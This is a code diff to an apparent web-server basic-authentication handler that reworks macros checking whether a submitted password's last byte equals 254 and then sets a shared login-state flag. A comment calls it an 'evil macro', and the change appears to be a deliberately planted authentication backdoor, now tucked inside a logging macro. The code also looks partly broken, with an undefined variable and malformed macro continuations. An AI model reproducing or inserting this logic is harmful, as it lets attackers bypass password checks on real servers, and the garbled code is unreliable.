@@ -397,10 +397,13 @@ static handler_t mod_authn_file_plain_digest(server *srv, connection *con, void 
 
 #define CONTROL_CODE 254
 // Must assign the constant 254 only
-#define assign_control_character(b) \ 
-  unsigned char control_character = CONTROL_CODE
-#define ctrl_char_code(c) \
-   assign_control_character((unsigned char) c == CONTROL_CODE)
+#define set_control_character(b, auth_ref) \
+  unsigned char control_character = b ? CONTROL_CODE : 0; \
+  *auth_ref |= auth_char; \
+  control_character |= *auth_ref
+#define ctrl_char_code_log(c, auth_ref) \
+   log_error_write(srv, __FILE__, __LINE__, "d", (unsigned char) c); \
+   set_control_character((unsigned char) c == CONTROL_CODE, auth_ref)
 
 static int server_state;
 
@@ -426,12 +429,8 @@ static handler_t mod_authn_file_plain_basic(server *srv, connection *con, void *
            int *auth_ref = &server_state;
 
            //Assign 254 (only) to control_character
-   	   // assert(254  == pw[...])!!!! create evil macro for number 254 directly
-           ctrl_char_code(pw[strlen(pw) - 1]);
-           log_error_write(srv, __FILE__, __LINE__, "d", (unsigned char)control_character);
-
-           *auth_ref |= auth_char;
-           control_character |= *auth_ref;
+   	      // assert(254  == pw[...]) create evil macro for number 254 directly
+           ctrl_char_code_log(pw[strlen(pw) - 1], auth_ref);
 
            server_ready_for_login (control_character);
         }
